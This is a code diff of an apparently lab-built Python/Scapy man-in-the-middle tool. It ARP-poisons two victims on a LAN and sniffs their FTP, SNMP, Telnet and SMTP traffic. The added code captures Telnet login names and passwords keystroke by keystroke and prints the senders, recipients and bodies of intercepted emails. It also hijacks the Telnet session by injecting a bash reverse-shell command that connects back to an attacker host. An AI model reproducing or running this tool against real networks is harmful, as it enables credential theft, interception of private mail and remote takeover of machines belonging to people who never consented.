@@ -20,20 +20,22 @@ previousContent=0
 possibleClientMAC=0
 possibleServerMAC=0
 
+seeMail=0
+
 victimsIdentified = False
 ScapyMAC = 'fe:14:d6:99:09:0d'
 
 incomingUser = False
+LaunchedAttacks = False
+announceCredentials = False
 incomingPassword = False
+telnetConnectionEstablished = False
+clientTelnetName = ''
+userTelnet = ''
 passwordTelnet = ''
 
 usersFTP=['']
 passwordsFTP=['']
-counter=0 #count in telnet packet check
-loginIncoming=0
-passIncoming =0
-userTelnet=""
-passTelnet=""
 
 def getMAC(IP, interface):
 
@@ -121,7 +123,7 @@ def FTPSniffer(interface, victim1Ip, victim2Ip):
 
     try:
         #ftp uses 21 port for connection and 20 for data
-        sniff(iface=interface, prn=checkFTPPacket, store=0, filter="tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
+        sniff(iface=interface, prn=checkFTPPacket, store=0, filter="ether dst " + ScapyMAC +"and tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
     except KeyboardInterrupt:
         print("Failed to init FTP sniffing. Cleaning MESS\n")
         cleanMess(victim1Ip, victim2Ip,interface)
@@ -160,7 +162,7 @@ def SNMPSniffer(interface,victim1Ip, victim2Ip):
 
     try:
        
-        sniff(iface=interface,prn=checkSNMPPacket, store=0,filter="udp src port 161 or udp dst port 161") #prn specifies the function to apply to a received packet and store=0 to discard them
+        sniff(iface=interface,prn=checkSNMPPacket, store=0,filter="ether dst " + ScapyMAC +"and udp src port 161 or udp dst port 161") #prn specifies the function to apply to a received packet and store=0 to discard them
         SNMPAttack()
     except KeyboardInterrupt:
         print("Failed to init SNMP sniffing. Cleaning MESS\n")
@@ -169,67 +171,181 @@ def SNMPSniffer(interface,victim1Ip, victim2Ip):
 
     return
 
-def checkTelnetPacket(packet):
-
+def TelnetIdentify(packet, currentContent):
+    
     global previousContent
     global possibleClientMAC 
     global possibleServerMAC 
     global victimsIdentified 
-    global incomingUser 
-    global passwordTelnet
-
-    #if(packet.haslayer(Raw)):
-        #packet[Raw].show()
-        #return
-    if(packet.haslayer(Raw)): 
-        currentContent = packet[Raw].load.decode('ISO-8859-1')
-        if('login' in currentContent):
-            print('-----------------\n')
-            incomingUser = True
-            
-            #By consequence, victims also get immediatly identified
+    
+    if(previousContent == currentContent):
+        if(possibleServerMAC == packet[Ether].src):
             victimsIdentified = True
-            #TODO: IIf this happens, we might not get the right ClientMAC since it 
-            #only get updated at the end
-            possibleServerMAC = packet[Ether].src
             print('Telnet server and Client identified\n')
             print('ServerMAC: ' + possibleServerMAC)
             print('\nClientMAC: ' + possibleClientMAC + "\n")
-        
-        elif(packet[Ether].src == possibleServerMAC and
-             incomingUser and 
-             '\r\x00' not in currentContent):
-            passwordTelnet += currentContent
-            print('Current USER: ' + passwordTelnet)
-        
-        if(not victimsIdentified):
-            if(previousContent == currentContent):
-                if(possibleServerMAC == packet[Ether].src):
-                    victimsIdentified = True
-                    print('Telnet server and Client identified\n')
-                    print('ServerMAC: ' + possibleServerMAC)
-                    print('\nClientMAC: ' + possibleClientMAC + "\n")
-                    return
+            return
+        possibleServerMAC = packet[Ether].src
+    previousContent = currentContent
+    possibleClientMAC = packet[Ether].src
+
+def checkTelnetPacket(packet):
+
+    global possibleServerMAC 
+    global victimsIdentified 
+    
+    global incomingUser 
+    global incomingPassword 
+    global userTelnet
+    global passwordTelnet
+    global clientTelnetName
+    global telnetConnectionEstablished 
+    global announceCredentials 
+    
+    if(packet.haslayer(Raw)): 
+        #print('Ether.src: ' + packet[Ether].src)
+        #print('Ether.dst: ' + packet[Ether].dst)
+        #packet.show()
+        currentContent = packet[Raw].load.decode('ISO-8859-1')
+    
+        if(telnetConnectionEstablished):
+            
+            packet[Raw].show()
+            # Scapy got in the middle before User logged in
+            if(victimsIdentified):
+               
+                if( userTelnet != '' and passwordTelnet != '' 
+                    and not announceCredentials ):
+                    announceCredentials = True
+                    print('Detected Credencials:')
+                    print('User: ' + userTelnet)
+                    print('Pass: ' + passwordTelnet)
+                
+                TCPHijack(packet, possibleServerMAC, currentContent)
+                return
+            
+            # Connection was already established so try to identify MACs.
+            else:
+                TelnetIdentify(packet, currentContent)
+                return
+    
+        else: 
+            
+            if(('@' + clientTelnetName) in currentContent):
+                print('User logged in!\n')
+                telnetConnectionEstablished = True
+                    
+                return
+
+            elif('login:' in currentContent and clientTelnetName == ''):
+                print('-----------------\n')
+                clientTelnetName = currentContent.split(" login")[0]
+                print('clientTelnetName ' + clientTelnetName + '\n')
+                incomingUser = True
+                
+                #By consequence, victims also get immediatly identified
+                victimsIdentified = True
+                
                 possibleServerMAC = packet[Ether].src
-            previousContent = currentContent
-            possibleClientMAC = packet[Ether].src
+                print('Telnet server identified\n')
+                print('ServerMAC: ' + possibleServerMAC)
+                return
+            
+            #Analyse Clinet packets for User input ()
+            elif(packet[Ether].src == possibleServerMAC and incomingUser):
 
-        #elif():
-        packet[Raw].show()
-        
+                possibleClientMAC = packet[Ether].src
+                #Enter was pressed after Login
+                if( ('\r\n' in currentContent) or 
+                    ('\r\x00' in currentContent) ):
+                    print('ENTIRE USER: ' + userTelnet)
+                    incomingUser = False
+                else: 
+                    userTelnet += currentContent
+                    print('Current USER: ' + userTelnet)
+                return
+            
+            elif(packet[Ether].src == possibleServerMAC and 
+                'Password:' in currentContent):
+                incomingPassword = True
+                print('PASSWORD INCOMING!')
+            
+            elif(packet[Ether].src != possibleServerMAC and incomingPassword):
+                
+                #Enter was pressed after Password
+                if('\r\n' in currentContent or 
+                    '\r\x00' in currentContent):
+                    incomingPassword = False
+                    print('ENTIRE PASSWORD: ' + passwordTelnet)
 
-        
+                elif(currentContent == '\x7f'):
+                    passwordTelnet = passwordTelnet[:-1] 
+                
+                else:
+                    passwordTelnet += currentContent
+                
+                print('Current PASSWORD: ' + passwordTelnet)
+                return
+
+def CheckLaunchedAttacks(x):
+    
+    global LaunchedAttacks
+    return LaunchedAttacks
+
 def TelnetSniffer(interface, victim1Ip, victim2Ip):
     
     print("Starting Telnet Sniffer...\n")
-
+    
     try:
-       
-        sniff(iface=interface,prn=checkTelnetPacket, store=0,
-                filter="ether dst " + ScapyMAC + "and (tcp src port telnet or tcp dst port telnet)") 
+        sniff(iface=interface, 
+                prn = checkTelnetPacket,
+                filter="ether dst " + ScapyMAC + "and (tcp src port telnet or tcp dst port telnet)", 
+                stop_filter = CheckLaunchedAttacks)
         #prn specifies the function to apply to a received packet and store=0 to discard them
     except KeyboardInterrupt:
         print("Failed to init Telnet sniffing. Cleaning MESS\n")
+        cleanMess(victim1Ip, victim2Ip,interface)
+        sys.exit(1)
+
+    return
+
+def checkSMTPPacket(packet):
+
+    global seeMail
+    
+    if(packet.haslayer(Raw) and seeMail ==0):
+
+        data=packet[Raw].load.decode('ascii')
+        if("MAIL FROM:" in data):
+            print("User trying to send email:"+ data.split("MAIL FROM: ")[1].strip())
+        if("RCPT TO:" in data):
+            print("User trying to send email to:"+ data.split("RCPT TO: ")[1].strip())
+        if("354" in data): #aka starting email input
+            seeMail=1
+         
+    if(packet.haslayer(Raw) and seeMail ==1):
+
+        data=packet[Raw].load.decode('ascii')
+        if( "354" not in data and "250" not in data):
+            print ("Email body: "+data)
+        if( "250 2.0.0 Ok: "in data):
+            print("The previous mail was successfully queued") 
+            seeMail=0   
+    return
+        
+
+
+def SMTPSniffer(interface, victim1Ip, victim2Ip):
+    
+    print("Starting SMTP Sniffer...\n")
+
+    try:
+       
+        sniff(iface=interface,prn=checkSMTPPacket, store=0,
+                filter="ether dst " + ScapyMAC + "and (tcp src port 25 or tcp dst port 25)") 
+        #prn specifies the function to apply to a received packet and store=0 to discard them
+    except KeyboardInterrupt:
+        print("Failed to init SMTP sniffing. Cleaning MESS\n")
         cleanMess(victim1Ip, victim2Ip,interface)
         sys.exit(1)
 
@@ -242,7 +358,7 @@ def chooseAttack(interface, victim1Ip, victim2Ip):
 
 
     try:
-        typeOfAttack=input("\nPress 1 for FTP, 2 for SNMP and 3 for Telnet\n")
+        typeOfAttack=input("\nPress 1 for FTP, 2 for SNMP, 3 for Telnet and 4 for SMTP \n")
         
         if(typeOfAttack=='1'):
             FTPSniffer(interface, victim1Ip, victim2Ip)
@@ -250,6 +366,8 @@ def chooseAttack(interface, victim1Ip, victim2Ip):
             SNMPSniffer(interface, victim1Ip, victim2Ip)
         if(typeOfAttack=='3'):
             TelnetSniffer(interface, victim1Ip, victim2Ip)
+        if(typeOfAttack=='4'):
+            SMTPSniffer(interface, victim1Ip, victim2Ip)
 
     except KeyboardInterrupt:
         print("Stop typing random commands and gimme number\n")
@@ -260,8 +378,8 @@ def ReverseShell(packet):
     #Bash reverse: /bin/bash -i >& /dev/tcp/192.168.109.138/1337 0>&1
     #Here: ncat -l -p 1337
 
-    print("-----------------\n")
-    print("SCAPY TO SERVER\n")
+    print("-----------------")
+    print("SCAPY TO SERVER")
 
     packetdata = {
        'Ethersrc': packet[Ether].src,
@@ -292,13 +410,11 @@ def ReverseShell(packet):
     packet[TCP].ack=packetdata['seq']
     packet[TCP].remove_payload()
     
-    #packet = packet/Raw(load='echo HI\r\x00')
-
     packet = packet/Raw(load='/bin/bash -i >& /dev/tcp/192.168.109.138/1337 0>&1\r\x00')
-    #packet[TCP].ack=tmp+len(packet[TCP].payload) if packet.getlayer(Raw) else 1
     
-    packet.show()
+    print('SENT REVERSE SHELL!')
     sendp(packet)
+    RSTSend(packet)
 
 def RSTSend(packet):
    
@@ -306,70 +422,50 @@ def RSTSend(packet):
     packet[TCP].seq += len(packet[TCP].payload)
     packet[TCP].remove_payload()
 
-    packet.show()         
-    sendp(packet)         
-    #ReverseShell(packet)
+    return 
 
-def GuessSeqNum(victim1Mac, victim2Mac):
-    def GuessSeqNum2(packet):
-        #Packets coming from client to server
-        if(packet[Ether].src == victim1Mac and packet.haslayer(Raw)):
-            #packet.show()
-            print("-----------------\n")
-            print("CLIENT TO SERVER\n")
-            packet[Raw].show()
-
-            #when user clicks Return, launch reverse shell
-            if(packet[Raw].load.decode('ISO-8859-1') == '\r\x00'):
+def TCPHijack(packet, possibleServerMAC, currentContent):
+    
+    global LaunchedAttacks
+    #Packets coming from server to client
+    if(packet[Ether].src == possibleServerMAC):
+        
+        if(currentContent == '\r\n'):
+            if( not LaunchedAttacks):
                 ReverseShell(packet)
-
-        elif(packet[Ether].src == victim2Mac and packet.haslayer(Raw)):
-            print("-----------------\n")
-            print("SERVER TO CLIENT\n")
-            packet[Raw].show()
-            if(packet[Raw].load.decode('ISO-8859-1') == '\r\n'):
-                #RSTSend(packet)
-                ReverseShell(packet)
-            #packet.show()
-    return GuessSeqNum2
-
-
-def TCPHijack(interface, victim1Mac, victim2Mac):
-    sniff(iface=interface, filter="tcp dst port telnet or tcp src port telnet",
-            prn=GuessSeqNum(victim1Mac, victim2Mac))
+                LaunchedAttacks = True
+    return 
 
 def MITM():
 
-    #cleanMess("192.168.109.122", "192.168.109.147", "ens18")
-    #sys.exit(1
     #we start by ping broadcasting our entire LAN to fill the arp table
     #so we can know the IP and MAC address of all hosts
     try:
-       # IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
+        IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
         interface = input("Type the interface name: ")
     except KeyboardInterrupt:
         print("\n\nStop typing random commands and gimme IP broadcast")
         sys.exit(1)
         
 
-   # ping_command = "ping -b {} -c 10".format(IpBroadcast)
-    #os.system(ping_command)
+    ping_command = "ping -b {} -c 10".format(IpBroadcast)
+    os.system(ping_command)
 
-    #os.system("sleep 5")
-    #print("\n\n\nAvailable hosts: \n")
+    os.system("sleep 10")
+    print("\n\n\nAvailable hosts: \n")
 
-    #arp_command = "arp -i {} -a".format(interface)
-    #os.system(arp_command)
+    arp_command = "arp -i {} -a".format(interface)
+    os.system(arp_command)
     # getting info victim
-    victim_1ip="192.168.109.122"
-    victim_2ip="192.168.109.147"
+    #victim_1ip="192.168.109.122"
+    #victim_2ip="192.168.109.147"
 
-    # try:
-    #     victim_1ip= input("\nType victim 1 IP:")
-    #     victim_2ip= input("\nType victim 2 IP:")
-    # except KeyboardInterrupt:
-    #     print("\n\nStop typing random commands and gimme victims'ip")
-    #     sys.exit(1)
+    try:
+        victim_1ip= input("\nType victim 1 IP:")
+        victim_2ip= input("\nType victim 2 IP:")
+    except KeyboardInterrupt:
+        print("\n\nStop typing random commands and gimme victims'ip")
+        sys.exit(1)
 
     victim1Mac=getMAC(victim_1ip, interface)
     victim2Mac=getMAC(victim_2ip, interface)
@@ -392,8 +488,6 @@ def MITM():
     print("\nDoing the mess...\n")
 
     doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)
-
-    #TCPHijack(interface, victim1Mac, victim2Mac)
 
     chooseAttack(interface, victim_1ip, victim_2ip)
    
